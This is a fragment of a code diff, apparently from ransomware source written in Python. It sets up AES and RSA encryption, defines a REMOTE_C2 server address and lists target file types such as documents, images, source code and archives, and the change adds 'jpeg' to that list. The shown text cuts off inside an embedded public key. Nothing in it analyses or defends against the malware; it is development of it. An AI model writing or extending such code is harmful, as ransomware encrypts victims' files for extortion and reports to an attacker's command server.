@@ -17,7 +17,7 @@ from tempfile import NamedTemporaryFile
 from Cryptodome.Cipher import AES, PKCS1_OAEP
 from Cryptodome.Random import get_random_bytes
 
-tgt_exts = ['txt', 'png', 'jpg', 'pdf', 'docx', 'mp3', 'mov', 'md', 'bat', 'py', 'mp4', 'doc', 'js', 'c', 'java', '7z', 'bz2', 'zip', 'gz', 'tar', 'gif', 'html', 'h', 'sln', 'vcproj']
+tgt_exts = ['txt', 'png', 'jpg', 'jpeg', 'pdf', 'docx', 'mp3', 'mov', 'md', 'bat', 'py', 'mp4', 'doc', 'js', 'c', 'java', '7z', 'bz2', 'zip', 'gz', 'tar', 'gif', 'html', 'h', 'sln', 'vcproj']
 REMOTE_C2='http://192.168.230.128:9000'
 PUBLIC_KEY='''-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkhgXKdG6b2S3AjafAdmc
